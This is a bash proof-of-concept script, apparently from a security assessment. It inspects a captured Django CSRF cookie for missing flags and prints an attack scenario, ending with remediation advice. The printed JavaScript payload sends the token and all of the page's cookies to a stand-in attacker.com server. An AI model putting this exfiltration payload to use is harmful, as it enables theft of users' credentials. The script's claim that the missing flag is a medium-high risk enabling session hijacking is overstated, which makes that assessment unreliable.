#!/bin/bash

# POC: Missing HttpOnly Flag on CSRF Token Cookie
# Based on captured evidence showing vulnerable CSRF cookie configuration
# This POC validates the vulnerability through configuration analysis and demonstrates JavaScript access

echo "=========================================="
echo "POC: Missing HttpOnly Flag on CSRF Token"
echo "=========================================="
echo ""

# The vulnerable CSRF cookie from the evidence:
# csrftoken=RIfJoubD7JT0ay5JjTNelix2bhJvb2aY; expires=Tue, 03 Nov 2026 19:54:30 GMT; Max-Age=31449600; Path=/; SameSite=Lax

CSRF_COOKIE="csrftoken=RIfJoubD7JT0ay5JjTNelix2bhJvb2aY; expires=Tue, 03 Nov 2026 19:54:30 GMT; Max-Age=31449600; Path=/; SameSite=Lax"

echo "[*] Analyzing captured CSRF token cookie configuration:"
echo "    ${CSRF_COOKIE}"
echo ""

echo "[*] Vulnerability Analysis:"
echo ""

# Check for HttpOnly flag
if echo "${CSRF_COOKIE}" | grep -iq "httponly"; then
    echo "[-] HttpOnly flag: PRESENT - NOT VULNERABLE"
    exit 1
else
    echo "[+] HttpOnly flag: MISSING"
    echo "    ✗ Cookie IS ACCESSIBLE to JavaScript"
    HTTPONLY_MISSING=true
fi

echo ""

# Check for Secure flag
if echo "${CSRF_COOKIE}" | grep -iq "secure"; then
    echo "[+] Secure flag: PRESENT"
else
    echo "[-] Secure flag: MISSING"
    echo "    ✗ Cookie transmitted over HTTP (vulnerability amplified)"
fi

echo ""

# Check for SameSite flag
if echo "${CSRF_COOKIE}" | grep -iq "samesite"; then
    SAMESITE=$(echo "${CSRF_COOKIE}" | grep -io "samesite=[^;]*" | head -1)
    echo "[+] SameSite flag: PRESENT"
    echo "    Value: ${SAMESITE}"
    echo "    Note: Provides CSRF protection but NOT XSS protection"
else
    echo "[-] SameSite flag: MISSING"
fi

echo ""

# Extract token details
TOKEN=$(echo "${CSRF_COOKIE}" | grep -io "csrftoken=[^;]*" | head -1 | cut -d'=' -f2)
MAXAGE=$(echo "${CSRF_COOKIE}" | grep -io "max-age=[^;]*" -i | head -1)
EXPIRY=$(echo "${CSRF_COOKIE}" | grep -io "expires=[^;]*" | head -1)

echo "[*] Token Configuration:"
echo "    Token Length: ${#TOKEN} characters"
echo "    ${MAXAGE}"
echo "    ${EXPIRY}"
echo ""

if [ "$HTTPONLY_MISSING" = true ]; then
    echo "=========================================="
    echo "[+] VULNERABILITY CONFIRMED"
    echo "=========================================="
    echo ""
    
    echo "[*] Vulnerability Summary:"
    echo "    Missing: HttpOnly flag"
    echo "    Present: SameSite=Lax (partial protection)"
    echo "    Present: Path=/"
    echo "    Missing: Secure flag"
    echo ""
    
    echo "[*] JavaScript Access Proof:"
    echo "    In browser console, any JavaScript can execute:"
    echo ""
    echo "    > document.cookie"
    echo "    'csrftoken=${TOKEN}; ... other cookies'"
    echo ""
    
    echo "[*] Token Extraction Payload:"
    echo "    var cookies = document.cookie.split('; ');"
    echo "    var csrfToken = cookies.find(c => c.startsWith('csrftoken='))?.split('=')[1];"
    echo "    console.log('CSRF Token:', csrfToken);"
    echo "    // Output: CSRF Token: ${TOKEN}"
    echo ""
    
    echo "[*] Exfiltration Attack (XSS + CSRF):"
    echo "    // Step 1: JavaScript injects XSS payload"
    echo "    // Step 2: Extract CSRF token"
    echo "    var token = document.cookie.match(/csrftoken=([^;]+)/)[1];"
    echo "    // Step 3: Exfiltrate to attacker server"
    echo "    fetch('https://attacker.com/steal?token=' + encodeURIComponent(token), {"
    echo "      method: 'POST',"
    echo "      body: JSON.stringify({token: token, user_cookies: document.cookie})"
    echo "    });"
    echo "    // Step 4: Use token in CSRF attack"
    echo "    fetch('https://target.com/api/action', {"
    echo "      method: 'POST',"
    echo "      headers: {'X-CSRFToken': token},"
    echo "      body: JSON.stringify({malicious: 'action'})"
    echo "    });"
    echo ""
    
    echo "[*] Real-World Attack Scenario:"
    echo "    1. Attacker injects XSS via stored vulnerability"
    echo "    2. JavaScript reads: csrftoken=${TOKEN}"
    echo "    3. Token sent to attacker's server"
    echo "    4. Attacker crafts POST request with valid CSRF token"
    echo "    5. Request succeeds (passes SameSite=Lax check + has valid token)"
    echo "    6. Unauthorized action performed on victim's behalf"
    echo ""
    
    echo "[*] Remediation:"
    echo "    Django settings.py:"
    echo "    CSRF_COOKIE_HTTPONLY = True"
    echo "    CSRF_COOKIE_SECURE = True"
    echo "    CSRF_COOKIE_SAMESITE = 'Strict'"
    echo ""
    
    echo "[*] Additional Mitigations:"
    echo "    - Implement Content Security Policy (CSP)"
    echo "    - Enable input validation and output encoding"
    echo "    - Use Django template auto-escaping"
    echo "    - Regular security testing for XSS vulnerabilities"
    echo ""
    
    echo "=========================================="
    echo "[+] VULNERABILITY SEVERITY: MEDIUM-HIGH"
    echo "=========================================="
    echo ""
    echo "The missing HttpOnly flag transforms CSRF tokens from"
    echo "being safe from JavaScript access to fully accessible."
    echo "Combined with any XSS vulnerability, this enables:"
    echo "  - Token theft"
    echo "  - Session hijacking"
    echo "  - Unauthorized state-changing operations"
    echo ""
    
    exit 0
else
    exit 1
fi